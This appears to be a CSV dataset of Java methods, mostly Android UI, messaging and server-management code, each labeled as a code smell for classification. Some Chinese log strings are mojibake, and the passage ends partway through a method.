text,label,text_label
"private TLRPC.TL_messages_stickerSet getCachedStickerSetInternal(long id,Integer hash){
  TLRPC.TL_messages_stickerSet set=null;
  SQLiteCursor cursor=null;
  NativeByteBuffer data=null;
  try {
    cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT data, hash FROM stickersets WHERE id = "" + id + "" LIMIT 1"");
    if (cursor.next() && !cursor.isNull(0)) {
      data=cursor.byteBufferValue(0);
      if (data != null) {
        set=TLRPC.TL_messages_stickerSet.TLdeserialize(data,data.readInt32(false),false);
        int cachedHash=cursor.intValue(1);
        if (hash != null && hash != 0 && hash != cachedHash) {
          return null;
        }
      }
    }
  }
 catch (  Throwable e) {
    FileLog.e(e);
  }
 finally {
    if (data != null) {
      data.reuse();
    }
    if (cursor != null) {
      cursor.dispose();
    }
  }
  return set;
}",1,Code Smell
"public void onDragEnter(ItemInfo dragInfo){
  if (mFolder.isDestroyed() || !willAcceptItem(dragInfo))   return;
  CellLayoutLayoutParams lp=(CellLayoutLayoutParams)getLayoutParams();
  CellLayout cl=(CellLayout)getParent().getParent();
  mBackground.animateToAccept(cl,lp.getCellX(),lp.getCellY());
  mOpenAlarm.setOnAlarmListener(mOnOpenListener);
  if (SPRING_LOADING_ENABLED && ((dragInfo instanceof WorkspaceItemFactory) || (dragInfo instanceof WorkspaceItemInfo) || (dragInfo instanceof PendingAddShortcutInfo))) {
    mOpenAlarm.setAlarm(ON_OPEN_DELAY);
  }
}
",1,Code Smell
"/** 
 * Book broker report info
 * @param isRegister         request method
 * @param isOnline           if broker is ready
 * @param repConfigId        report configure id
 * @param repCheckSumId      report configure check sum
 * @param isTackData         if tack data in request
 * @param repBrokerConfInfo  tacked broker configure
 * @param repTopicConfs      tacked topic configure
 * @param sBuffer            string process container
 */
public void bookBrokerReportInfo(boolean isRegister,boolean isOnline,long repConfigId,int repCheckSumId,boolean isTackData,String repBrokerConfInfo,List<String> repTopicConfs,StringBuilder sBuffer){
  this.isOnline=isOnline;
  boolean isSynchronized=brokerSyncData.bookBrokerReportInfo(brokerInfo,repConfigId,repCheckSumId,isTackData,repBrokerConfInfo,repTopicConfs);
  if (isRegister && isOnline && isTackData) {
    Tuple2<ManageStatus,Map<String,TopicInfo>> syncData=brokerSyncData.getBrokerPublishInfo();
    brokerRunManager.iniBrokerConfInfo(brokerInfo.getBrokerId(),syncData.getF0(),syncData.getF1());
  }
  goNextStatus(isRegister,isSynchronized,sBuffer);
}",1,Code Smell
"@Override public void sendMessageToClient(ChannelInfo clientChannelInfo,String targetClient,WebSocketFrame message,EventContext context){
  String workspaceId=clientChannelInfo.getWorkspaceId();
  try {
    Map<String,ChannelInfo> sessionGroup;
    if (context.isBroadcast()) {
      sessionGroup=sessionService.getSessionMap(workspaceId);
    }
 else {
      sessionGroup=sessionService.getSessionGroup(workspaceId,targetClient);
    }
    if (sessionGroup != null) {
      for (      ChannelInfo channelInfo : sessionGroup.values()) {
        if (workspaceId.equals(channelInfo.workspaceId) && (channelInfo.channelType.equals(ChannelType.CLIENT) || channelInfo.channelType.equals(ChannelType.API))) {
          channelInfo.channel.writeAndFlush(message.copy());
        }
      }
    }
  }
  finally {
    message.release();
  }
}
",1,Code Smell
"@Override public void systemAboutToSleep(SystemSleepEvent e){
  if (AppPrefs.get() != null && AppPrefs.get().lockVaultOnHibernation().get() && AppPrefs.get().getLockCrypt().get() != null && !AppPrefs.get().getLockCrypt().get().isBlank()) {
    ThreadHelper.runAsync(() -> {
      ThreadHelper.sleep(1000);
      OperationMode.close();
    }
);
  }
}",1,Code Smell
"public DevicePaddings(Context context,int devicePaddingId){
  try (XmlResourceParser parser=context.getResources().getXml(devicePaddingId)){
    final int depth=parser.getDepth();
    int type;
    while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > depth) && type != XmlPullParser.END_DOCUMENT) {
      if ((type == XmlPullParser.START_TAG) && DEVICE_PADDINGS.equals(parser.getName())) {
        final int displayDepth=parser.getDepth();
        while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > displayDepth) && type != XmlPullParser.END_DOCUMENT) {
          if ((type == XmlPullParser.START_TAG) && DEVICE_PADDING.equals(parser.getName())) {
            TypedArray a=context.obtainStyledAttributes(Xml.asAttributeSet(parser),R.styleable.DevicePadding);
            int maxWidthPx=a.getDimensionPixelSize(R.styleable.DevicePadding_maxEmptySpace,0);
            a.recycle();
            PaddingFormula workspaceTopPadding=null;
            PaddingFormula workspaceBottomPadding=null;
            PaddingFormula hotseatBottomPadding=null;
            final int limitDepth=parser.getDepth();
            while (((type=parser.next()) != XmlPullParser.END_TAG || parser.getDepth() > limitDepth) && type != XmlPullParser.END_DOCUMENT) {
              AttributeSet attr=Xml.asAttributeSet(parser);
              if ((type == XmlPullParser.START_TAG)) {
                if (WORKSPACE_TOP_PADDING.equals(parser.getName())) {
                  workspaceTopPadding=new PaddingFormula(context,attr);
                }
 else                 if (WORKSPACE_BOTTOM_PADDING.equals(parser.getName())) {
                  workspaceBottomPadding=new PaddingFormula(context,attr);
                }
 else                 if (HOTSEAT_BOTTOM_PADDING.equals(parser.getName())) {
                  hotseatBottomPadding=new PaddingFormula(context,attr);
                }
              }
            }
            if (workspaceTopPadding == null || workspaceBottomPadding == null || hotseatBottomPadding == null) {
              if (Utilities.IS_DEBUG_DEVICE) {
                throw new RuntimeException(""DevicePadding missing padding."");
              }
            }
            DevicePadding dp=new DevicePadding(maxWidthPx,workspaceTopPadding,workspaceBottomPadding,hotseatBottomPadding);
            if (dp.isValid()) {
              mDevicePaddings.add(dp);
            }
 else {
              Log.e(TAG,""Invalid device padding found."");
              if (Utilities.IS_DEBUG_DEVICE) {
                throw new RuntimeException(""DevicePadding is invalid"");
              }
            }
          }
        }
      }
    }
  }
 catch (  IOException|XmlPullParserException e) {
    Log.e(TAG,""Failure parsing device padding layout."",e);
    throw new RuntimeException(e);
  }
  mDevicePaddings.sort((sl1,sl2) -> Integer.compare(sl1.maxEmptySpacePx,sl2.maxEmptySpacePx));
}",1,Code Smell
"@Override public void checkRepeatData(CfCarParkLinkUser cfCarParkLinkUser){
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(cfCarParkLinkUser.getUid());
  cfCarParkLinkUserQuery.setCarParkId(cfCarParkLinkUser.getCarParkId());
  cfCarParkLinkUserQuery.setPage(1);
  cfCarParkLinkUserQuery.setSize(1);
  List<CfCarParkLinkUser> cfCarParkLinkUsers=getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    if ((StringUtils.isNotEmpty(cfCarParkLinkUser.getId()) && !cfCarParkLinkUsers.get(0).getId().equals(cfCarParkLinkUser.getId())) || StringUtils.isEmpty(cfCarParkLinkUser.getId())) {
      ExceptionCast.cast(CommonCode.DUPLICATE_DATA);
    }
  }
}",1,Code Smell
"private void checkDone(boolean animated){
  if (doneButton == null)   return;
  final boolean hasChanges=hasChanges();
  doneButton.setEnabled(hasChanges);
  if (animated) {
    doneButton.animate().alpha(hasChanges ? 1.0f : 0.0f).scaleX(hasChanges ? 1.0f : 0.0f).scaleY(hasChanges ? 1.0f : 0.0f).setDuration(180).start();
  }
 else {
    doneButton.setAlpha(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleX(hasChanges ? 1.0f : 0.0f);
    doneButton.setScaleY(hasChanges ? 1.0f : 0.0f);
  }
  if (listView != null && listView.adapter != null && clearVisible != (currentLocation != null && (geo != null || !TextUtils.isEmpty(address)))) {
    listView.adapter.update(true);
  }
}",1,Code Smell
"@Override public View createView(Context context){
  View rootView=super.createView(context);
  resetHeader(false);
  DefaultItemAnimator defaultItemAnimator=new DefaultItemAnimator();
  defaultItemAnimator.setSupportsChangeAnimations(false);
  defaultItemAnimator.setDelayAnimations(false);
  listView.setItemAnimator(defaultItemAnimator);
  listView.setOnItemClickListener((view,position) -> {
    if (view instanceof GiftedUserCell) {
      GiftedUserCell cell=(GiftedUserCell)view;
      TL_stories.TL_boost boost=cell.getBoost();
      if (((boost.gift || boost.giveaway) && boost.user_id >= 0) || boost.unclaimed) {
        TLRPC.TL_payments_checkedGiftCode giftCode=new TLRPC.TL_payments_checkedGiftCode();
        giftCode.giveaway_msg_id=boost.giveaway_msg_id;
        giftCode.to_id=boost.user_id;
        giftCode.from_id=MessagesController.getInstance(UserConfig.selectedAccount).getPeer(-currentChat.id);
        giftCode.date=boost.date;
        giftCode.via_giveaway=boost.giveaway;
        giftCode.months=(boost.expires - boost.date) / 30 / 86400;
        if (boost.unclaimed) {
          giftCode.to_id=NO_USER_ID;
          giftCode.flags=-1;
        }
 else {
          giftCode.boost=boost;
        }
        new GiftInfoBottomSheet(this,false,true,giftCode,boost.used_gift_slug).show();
      }
 else       if (boost.giveaway && boost.user_id == NO_USER_ID) {
        final Bulletin.LottieLayout layout=new Bulletin.LottieLayout(getParentActivity(),getResourceProvider());
        layout.setAnimation(R.raw.chats_infotip,36,36);
        layout.textView.setText(LocaleController.getString(""BoostingRecipientWillBeSelected"",R.string.BoostingRecipientWillBeSelected));
        layout.textView.setSingleLine(false);
        layout.textView.setMaxLines(2);
        Bulletin.make(this,layout,Bulletin.DURATION_LONG).show();
      }
 else       if (!boost.gift && !boost.giveaway) {
        presentFragment(ProfileActivity.of(cell.getDialogId()));
      }
    }
    if (view instanceof TextCell) {
      BoostPagerBottomSheet.show(this,dialogId,resourceProvider);
    }
    if (view instanceof GiveawayCell) {
      BoostPagerBottomSheet.show(this,resourceProvider,dialogId,((GiveawayCell)view).getPrepaidGiveaway());
    }
    if (items.get(position).viewType == SHOW_MORE_VIEW_TYPE) {
      loadUsers(selectedTab == TAB_GIFTS);
    }
  }
);
  createEmptyView(getContext());
  loadStatistic();
  updateRows(false);
  return rootView;
}",1,Code Smell
"@Override public View focusSearch(View focused,int direction){
  if (focused != null) {
    View found=FocusFinder.getInstance().findNextFocus(this,focused,direction);
    if (direction == View.FOCUS_LEFT || direction == View.FOCUS_RIGHT) {
      if ((found == null || found.getId() != R.id.text) && getScrollState() == SCROLL_STATE_IDLE) {
        focused.clearAnimation();
        focused.startAnimation(shake);
        return null;
      }
    }
  }
  return super.focusSearch(focused,direction);
}
",1,Code Smell
"public static void loadChatParticipants(long chatId,int guid,String query,int offset,int count,Utilities.Callback<List<TLRPC.InputPeer>> onDone){
  MessagesController controller=MessagesController.getInstance(UserConfig.selectedAccount);
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_channels_getParticipants req=new TLRPC.TL_channels_getParticipants();
  req.channel=controller.getInputChannel(chatId);
  req.filter=query == null ? new TLRPC.TL_channelParticipantsRecent() : new TLRPC.TL_channelParticipantsSearch();
  req.filter.q=query == null ? """" : query;
  req.offset=offset;
  req.limit=count;
  int reqId=connection.sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    if (response instanceof TLRPC.TL_channels_channelParticipants) {
      TLRPC.TL_channels_channelParticipants res=((TLRPC.TL_channels_channelParticipants)response);
      controller.putUsers(res.users,false);
      controller.putChats(res.chats,false);
      long selfId=UserConfig.getInstance(UserConfig.selectedAccount).getClientUserId();
      List<TLRPC.InputPeer> result=new ArrayList<>();
      for (int a=0; a < res.participants.size(); a++) {
        TLRPC.Peer peer=res.participants.get(a).peer;
        if (MessageObject.getPeerId(peer) != selfId) {
          TLRPC.User user=controller.getUser(peer.user_id);
          if (user != null && !UserObject.isDeleted(user) && !user.bot) {
            result.add(controller.getInputPeer(peer));
          }
        }
      }
      onDone.run(result);
    }
  }
));
}",1,Code Smell
"public boolean processSwitchButton(TLRPC.TL_keyboardButtonSwitchInline button){
  if (inlineReturn == 0 || button.same_peer || parentLayout == null) {
    return false;
  }
  String query=""@"" + currentUser.username + "" ""+ button.query;
  if (inlineReturn == dialog_id) {
    inlineReturn=0;
    chatActivityEnterView.setFieldText(query);
  }
 else {
    getMediaDataController().saveDraft(inlineReturn,0,query,null,null,false);
    if (parentLayout.getFragmentStack().size() > 1) {
      BaseFragment prevFragment=parentLayout.getFragmentStack().get(parentLayout.getFragmentStack().size() - 2);
      if (prevFragment instanceof ChatActivity && ((ChatActivity)prevFragment).dialog_id == inlineReturn) {
        finishFragment();
      }
 else {
        Bundle bundle=new Bundle();
        if (DialogObject.isEncryptedDialog(inlineReturn)) {
          bundle.putInt(""enc_id"",DialogObject.getEncryptedChatId(inlineReturn));
        }
 else         if (DialogObject.isUserDialog(inlineReturn)) {
          bundle.putLong(""user_id"",inlineReturn);
        }
 else {
          bundle.putLong(""chat_id"",-inlineReturn);
        }
        addToPulledDialogsMyself();
        presentFragment(new ChatActivity(bundle),true);
      }
    }
  }
  return true;
}",1,Code Smell
"private Animation getEnterAnimation(){
  Animation enterAnim;
  if (enterAnimResId == R.anim.anim_dialogx_default_enter && exitAnimResId == R.anim.anim_dialogx_default_exit && baseView() == null) {
switch (align) {
case TOP:
case TOP_CENTER:
case TOP_LEFT:
case TOP_RIGHT:
      enterAnimResId=R.anim.anim_dialogx_top_enter;
    exitAnimResId=R.anim.anim_dialogx_top_exit;
  break;
case BOTTOM:
case BOTTOM_CENTER:
case BOTTOM_LEFT:
case BOTTOM_RIGHT:
enterAnimResId=R.anim.anim_dialogx_bottom_enter;
exitAnimResId=R.anim.anim_dialogx_bottom_exit;
break;
case LEFT:
case LEFT_CENTER:
case LEFT_TOP:
case LEFT_BOTTOM:
enterAnimResId=R.anim.anim_dialogx_left_enter;
exitAnimResId=R.anim.anim_dialogx_left_exit;
break;
case RIGHT:
case RIGHT_CENTER:
case RIGHT_TOP:
case RIGHT_BOTTOM:
enterAnimResId=R.anim.anim_dialogx_right_enter;
exitAnimResId=R.anim.anim_dialogx_right_exit;
break;
}
enterAnim=AnimationUtils.loadAnimation(getOwnActivity(),enterAnimResId);
enterAnim.setInterpolator(new DecelerateInterpolator(2f));
}
 else {
int enterAnimResIdTemp=R.anim.anim_dialogx_default_enter;
if (overrideEnterAnimRes != 0) {
enterAnimResIdTemp=overrideEnterAnimRes;
}
if (enterAnimResId != 0) {
enterAnimResIdTemp=enterAnimResId;
}
enterAnim=AnimationUtils.loadAnimation(getOwnActivity(),enterAnimResIdTemp);
}
long enterAnimDurationTemp=enterAnim.getDuration();
if (overrideEnterDuration >= 0) {
enterAnimDurationTemp=overrideEnterDuration;
}
if (enterAnimDuration >= 0) {
enterAnimDurationTemp=enterAnimDuration;
}
enterAnim.setDuration(enterAnimDurationTemp);
return enterAnim;
}",1,Code Smell
"@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaServerChangeEvent event){
  if (event.getMediaServerItemList() == null || event.getMediaServerItemList().isEmpty()) {
    return;
  }
  for (  MediaServer mediaServerItem : event.getMediaServerItemList()) {
    if (!type.equals(mediaServerItem.getType())) {
      continue;
    }
    logger.info(""[ZLM-娣诲姞寰呬笂绾胯妭鐐筣 ID锛"" + mediaServerItem.getId());
    offlineZlmPrimaryMap.put(mediaServerItem.getId(),mediaServerItem);
    offlineZlmTimeMap.put(mediaServerItem.getId(),System.currentTimeMillis());
    execute();
  }
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(HookZlmServerStartEvent event){
  if (event.getMediaServerItem() == null || !type.equals(event.getMediaServerItem().getType()) || event.getMediaServerItem().isStatus()) {
    return;
  }
  MediaServer serverItem=mediaServerService.getOne(event.getMediaServerItem().getId());
  if (serverItem == null) {
    return;
  }
  logger.info(""[ZLM-HOOK浜嬩欢-鏈嶅姟鍚姩] ID锛"" + event.getMediaServerItem().getId());
  online(serverItem,null);
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(HookZlmServerKeepaliveEvent event){
  if (event.getMediaServerItem() == null) {
    return;
  }
  MediaServer serverItem=mediaServerService.getOne(event.getMediaServerItem().getId());
  if (serverItem == null) {
    return;
  }
  logger.info(""[ZLM-HOOK浜嬩欢-蹇冭烦] ID锛"" + event.getMediaServerItem().getId());
  online(serverItem,null);
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaServerDeleteEvent event){
  if (event.getMediaServerId() == null) {
    return;
  }
  logger.info(""[ZLM-鑺傜偣琚Щ闄 ID锛"" + event.getMediaServerId());
  offlineZlmPrimaryMap.remove(event.getMediaServerId());
  offlineZlmsecondaryMap.remove(event.getMediaServerId());
  offlineZlmTimeMap.remove(event.getMediaServerId());
}
",1,Code Smell
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
switch (ev.getActionMasked()) {
case MotionEvent.ACTION_DOWN:
    initOrResetVelocityTracker();
  mVelocityTracker.addMovement(ev);
break;
case MotionEvent.ACTION_MOVE:
if (SCROLL_ORIENTATION != SCROLL_HORIZONTAL && (isIntercept || isIntercept(ev))) {
return true;
}
break;
case MotionEvent.ACTION_CANCEL:
case MotionEvent.ACTION_UP:
stopNestedScroll(ViewCompat.TYPE_TOUCH);
if (isBrake && SCROLL_ORIENTATION == SCROLL_NONE) {
return true;
}
break;
}
return super.onInterceptTouchEvent(ev);
}
",1,Code Smell
"private void onGetScreenCapImage(Device device,WView lastSelectView){
  try {
    if (device.getApiVersion() >= USE_TRANS_FILE_SDK_VERSION) {
      DeviceManager.executeCmd(project,new AdbCommand(new DeleteFileAction(TMP_TRANS_DATA_FILE_PATH),new DeleteFileAction(TMP_TRANS_IMAGE_FILE_PATH)),StringResponse.class);
    }
    final BroadcastAction broadcastAction=new BroadcastAction(ACTION_DEBUG_LAYOUT_INFO);
    broadcastAction.args(KEY_SAVE_TO_FILE,DeviceManager.isNeedSaveFile(project));
    broadcastAction.args(KEY_NEED_COLOR,mCodeLocatorWindow.getCodelocatorConfig().isPreviewColor());
    mApplicationResponse=DeviceManager.executeCmd(project,new AdbCommand(broadcastAction),ApplicationResponse.class);
    mApplication=mApplicationResponse.getData();
    if (mApplication == null || mApplication.getActivity() == null) {
      onGetApplicationInfoFailed();
      return;
    }
    if (allSameColor(mScreenCapImage)) {
      if (mApplication != null && mApplication.getActivity() != null && mApplication.getActivity().getDecorViews() != null && mApplication.getActivity().getDecorViews().size() > 0) {
        final List<WView> decorViews=mApplication.getActivity().getDecorViews();
        final WView wView=decorViews.get(0);
        final Image imageFromView=getImageFromView(wView);
        if (imageFromView != null) {
          mScreenCapImage=imageFromView;
        }
        calculateScaleScreenInfo();
        repaint();
      }
    }
    mApplication.setOverrideScreenWidth(device.getDeviceOverrideWidth());
    mApplication.setOverrideScreenHeight(device.getDeviceOverrideHeight());
    mApplication.setPhysicalWidth(device.getDeviceWidth());
    mApplication.setPhysicalHeight(device.getDeviceHeight());
    caclulateActivityInfo();
    mIsGrabbing=false;
    ThreadUtils.runOnUIThread(() -> {
      onGetApplicationInfoSuccess(lastSelectView);
    }
);
  }
 catch (  Throwable t) {
    Log.e(""鑾峰彇Activity淇℃伅澶辫触: "",t);
    mIsGrabbing=false;
    mApplicationResponse=null;
    mApplication=null;
    if (OnGetActivityInfoListener != null) {
      ThreadUtils.runOnUIThread(() -> {
        OnGetActivityInfoListener.onGetActivityInfoFailed(t);
        onClickViewChange(null);
      }
);
    }
  }
}",1,Code Smell
"public static int changeColorAccent(int themeBaseAccent,int accent,int color,boolean isDark){
  return changeColorAccent(themeBaseAccent,accent,color,isDark,color);
}
public static int changeColorAccent(int themeBaseAccent,int accent,int color,boolean isDark,int fallback){
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeBaseAccent,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,isDark,fallback);
}
public static int changeColorAccent(ThemeInfo themeInfo,int accent,int color){
  if (accent == 0 || themeInfo.accentBaseColor == 0 || accent == themeInfo.accentBaseColor || themeInfo.firstAccentIsDefault && themeInfo.currentAccentId == DEFALT_THEME_ACCENT_ID) {
    return color;
  }
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeInfo.accentBaseColor,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,themeInfo.isDark(),color);
}
public static int changeColorAccent(int color){
  ThemeAccent accent=currentTheme.getAccent(false);
  return changeColorAccent(currentTheme,accent != null ? accent.accentColor : 0,color);
}
public static int changeColorAccent(float[] baseHsv,float[] accentHsv,int color,boolean isDarkTheme,int fallback){
  if (tmpHSV5 == null) {
    tmpHSV5=new float[3];
  }
  float[] colorHsv=tmpHSV5;
  Color.colorToHSV(color,colorHsv);
  final float diffH=Math.min(abs(colorHsv[0] - baseHsv[0]),abs(colorHsv[0] - baseHsv[0] - 360f));
  if (diffH > 30f) {
    return fallback;
  }
  float dist=Math.min(1.5f * colorHsv[1] / baseHsv[1],1f);
  colorHsv[0]=colorHsv[0] + accentHsv[0] - baseHsv[0];
  colorHsv[1]=colorHsv[1] * accentHsv[1] / baseHsv[1];
  colorHsv[2]=colorHsv[2] * (1f - dist + dist * accentHsv[2] / baseHsv[2]);
  int newColor=Color.HSVToColor(Color.alpha(color),colorHsv);
  float origBrightness=AndroidUtilities.computePerceivedBrightness(color);
  float newBrightness=AndroidUtilities.computePerceivedBrightness(newColor);
  boolean needRevertBrightness=isDarkTheme ? origBrightness > newBrightness : origBrightness < newBrightness;
  if (needRevertBrightness) {
    float amountOfNew=0.6f;
    float fallbackAmount=(1f - amountOfNew) * origBrightness / newBrightness + amountOfNew;
    newColor=changeBrightness(newColor,fallbackAmount);
  }
  return newColor;
}",1,Code Smell
"@Override public boolean dispatchKeyEvent(@NonNull KeyEvent event){
  if (parentActivity == null) {
    return super.dispatchKeyEvent(event);
  }
  if (event.getAction() == KeyEvent.ACTION_DOWN && (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP || event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN)) {
    if (VoIPService.getSharedInstance() != null) {
      if (Build.VERSION.SDK_INT >= 32) {
        boolean oldValue=WebRtcAudioTrack.isSpeakerMuted();
        AudioManager am=(AudioManager)parentActivity.getSystemService(AUDIO_SERVICE);
        int minVolume=am.getStreamMinVolume(AudioManager.STREAM_VOICE_CALL);
        boolean mute=am.getStreamVolume(AudioManager.STREAM_VOICE_CALL) == minVolume && event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN;
        WebRtcAudioTrack.setSpeakerMute(mute);
        if (oldValue != WebRtcAudioTrack.isSpeakerMuted()) {
          getUndoView().showWithAction(0,mute ? UndoView.ACTION_VOIP_SOUND_MUTED : UndoView.ACTION_VOIP_SOUND_UNMUTED,null);
        }
      }
    }
  }
  return super.dispatchKeyEvent(event);
}",1,Code Smell
"private static void setLaterTime(long time){
  Log.i(TAG,""鑳介噺鎴愮啛鏃堕棿锛�"" + time);
  if (time > serverTime && serverTime > 0 && (laterTime < 0 || time < laterTime)) {
    laterTime=time;
    Log.i(TAG,laterTime - serverTime + ""ms 鍚庤兘閲忔垚鐔�"");
  }
}",1,Code Smell
"private static String formatInt(String decimal){
  BigDecimal bigDecimal=new BigDecimal(decimal).abs();
  if (bigDecimal.compareTo(BigDecimal.ZERO) == 0) {
    return """";
  }
  decimal=bigDecimal.toPlainString();
  StringBuilder stringBuilder=new StringBuilder();
  int j=0;
  for (int i=decimal.length() - 1; i >= 0; i--) {
    int n=decimal.charAt(i) - 48;
    String cn=CN_NUMBER[n];
    String un=UNITS1[j++];
    if (ObjectUtil.equals(0,n)) {
      if (StrUtil.isNotEmpty(stringBuilder) && !StrUtil.endWith(stringBuilder.toString(),CN_YUAN) && !StrUtil.endWith(stringBuilder.toString(),CN_ZERO)&& !StrUtil.endWith(stringBuilder.toString(),CN_TEN)&& !StrUtil.endWith(stringBuilder.toString(),CN_HUNDRED)&& !StrUtil.endWith(stringBuilder.toString(),CN_THOUSAND)&& !StrUtil.endWith(stringBuilder.toString(),CN_TEN_THOUSAND)) {
        stringBuilder.append(cn);
      }
      if (Arrays.asList(CN_YUAN,CN_TEN_THOUSAND).contains(un)) {
        stringBuilder.append(un);
      }
    }
 else {
      if (StrUtil.endWith(stringBuilder.toString(),CN_ZERO)) {
        stringBuilder=new StringBuilder(stringBuilder.substring(0,stringBuilder.length() - 1));
      }
      stringBuilder.append(un).append(cn);
    }
  }
  String str=stringBuilder.reverse().toString();
  if (str.endsWith(CN_ZERO)) {
    str=str.substring(0,str.length() - 1);
  }
  return str;
}",1,Code Smell
"private void cancelLoading(MessageObject messageObject){
  if (messageObject != null && !messageObject.mediaExists && !messageObject.putInDownloadsStore && !DownloadController.getInstance(currentAccount).isDownloading(messageObject.messageOwner.id)) {
    TLRPC.Document document=messageObject.getDocument();
    boolean loadDocumentFromImageReceiver=MessageObject.isStickerDocument(document) || MessageObject.isAnimatedStickerDocument(document,true) || MessageObject.isGifDocument(document)|| MessageObject.isRoundVideoDocument(document);
    if (!loadDocumentFromImageReceiver) {
      if (document != null) {
        FileLoader.getInstance(currentAccount).cancelLoadFile(document);
      }
 else {
        TLRPC.PhotoSize photo=FileLoader.getClosestPhotoSizeWithSize(messageObject.photoThumbs,AndroidUtilities.getPhotoSize());
        if (photo != null) {
          FileLoader.getInstance(currentAccount).cancelLoadFile(photo);
        }
      }
    }
  }
}
",1,Code Smell
"@Override public void transform(TransformOutputs outputs){
  Map<String,ModuleInfo> moduleInfo=getParameters().moduleInfo;
  Map<String,String> automaticModules=getParameters().automaticModules;
  File originalJar=getInputArtifact().get().getAsFile();
  String originalJarName=originalJar.getName();
  if ((isModule(originalJar) && !originalJarName.contains(""jackson"")) || originalJarName.startsWith(""javafx-"")) {
    outputs.file(originalJar);
  }
 else   if (moduleInfo.containsKey(originalJarName)) {
    addModuleDescriptor(originalJar,getModuleJar(outputs,originalJar),moduleInfo.get(originalJarName));
  }
 else   if (isAutoModule(originalJar)) {
    outputs.file(originalJar);
  }
 else   if (automaticModules.containsKey(originalJarName)) {
    addAutomaticModuleName(originalJar,getModuleJar(outputs,originalJar),automaticModules.get(originalJarName));
  }
 else   if (originalJarName.startsWith(""kotlin-stdlib-common"")) {
  }
 else {
    throw new RuntimeException(""Not a module and no mapping defined: "" + originalJarName);
  }
}
",1,Code Smell
"@Override public int scrollHorizontallyBy(int dx,RecyclerView.Recycler recycler,RecyclerView.State state){
  if (dx < 0 && pullingLeftOffset != 0) {
    float oldProgress=getPullingLeftProgress();
    pullingLeftOffset+=dx;
    float newProgress=getPullingLeftProgress();
    boolean b1=oldProgress > 1f;
    boolean b2=newProgress > 1f;
    if (b1 != b2) {
      recyclerListView.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
    }
    if (pullingLeftOffset < 0) {
      dx=(int)pullingLeftOffset;
      pullingLeftOffset=0;
    }
 else {
      dx=0;
    }
    if (customReactionsContainer != null) {
      customReactionsContainer.invalidate();
    }
    recyclerListView.invalidate();
  }
  int scrolled=super.scrollHorizontallyBy(dx,recycler,state);
  if (dx > 0 && scrolled == 0 && recyclerListView.getScrollState() == RecyclerView.SCROLL_STATE_DRAGGING && showCustomEmojiReaction()) {
    if (pullingDownBackAnimator != null) {
      pullingDownBackAnimator.removeAllListeners();
      pullingDownBackAnimator.cancel();
    }
    float oldProgress=getPullingLeftProgress();
    float k=0.6f;
    if (oldProgress > 1f) {
      k=0.05f;
    }
    pullingLeftOffset+=dx * k;
    float newProgress=getPullingLeftProgress();
    boolean b1=oldProgress > 1f;
    boolean b2=newProgress > 1f;
    if (b1 != b2) {
      recyclerListView.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP);
    }
    if (customReactionsContainer != null) {
      customReactionsContainer.invalidate();
    }
    recyclerListView.invalidate();
  }
  return scrolled;
}",1,Code Smell
"public TextRange(final CharSequence textAtCursor,final int wordAtCursorStartIndex,final int wordAtCursorEndIndex,final int cursorIndex,final boolean hasUrlSpans){
  if (wordAtCursorStartIndex < 0 || cursorIndex < wordAtCursorStartIndex || cursorIndex > wordAtCursorEndIndex || wordAtCursorEndIndex > textAtCursor.length()) {
    throw new IndexOutOfBoundsException();
  }
  mTextAtCursor=textAtCursor;
  mWordAtCursorStartIndex=wordAtCursorStartIndex;
  mWordAtCursorEndIndex=wordAtCursorEndIndex;
  mCursorIndex=cursorIndex;
  mHasUrlSpans=hasUrlSpans;
  mWord=mTextAtCursor.subSequence(mWordAtCursorStartIndex,mWordAtCursorEndIndex);
}",1,Code Smell
"/** 
 * Recovery topic deploy configurations
 * @param strBuff  the string buffer
 * @param result   the process result
 * @return         true for success, false for failure
 */
private boolean recoveryTopicDeployConfig(StringBuilder strBuff,ProcessResult result){
  logger.info(""[Recovery Topic Deploy] begin "");
  Map<String,TopicDeployEntity> storedTopicDeployMap=(Map<String,TopicDeployEntity>)readObjectFromFile(backupAndRecoveryPath,storeFileNameTopicDeploy);
  if (storedTopicDeployMap == null) {
    logger.error(strBuff.append(""  read configure file "").append(backupAndRecoveryPath).append(""/"").append(storeFileNameTopicDeploy).append("" failure!"").toString());
    strBuff.delete(0,strBuff.length());
    return false;
  }
  logger.info(""[Recovery Topic Deploy] upload topic-deploy configurations to master"");
  if (!writeTopicDeployInfo(storedTopicDeployMap,strBuff,result)) {
    logger.error(strBuff.append(""  write topic-deploy configurations failure!"").append(result.getErrMsg()).toString());
    strBuff.delete(0,strBuff.length());
    return false;
  }
  logger.info(""[Recovery Topic Deploy] read topic-deploy configurations from master"");
  Map<String,TopicDeployEntity> topicDeployMap=getTopicDeployInfos(strBuff);
  if (topicDeployMap == null) {
    logger.error(""  download topic deploy configurations is null!"");
    return false;
  }
  logger.info(""[Recovery Topic Deploy] verify configurations"");
  Set<String> srcTopicSet=new HashSet<>();
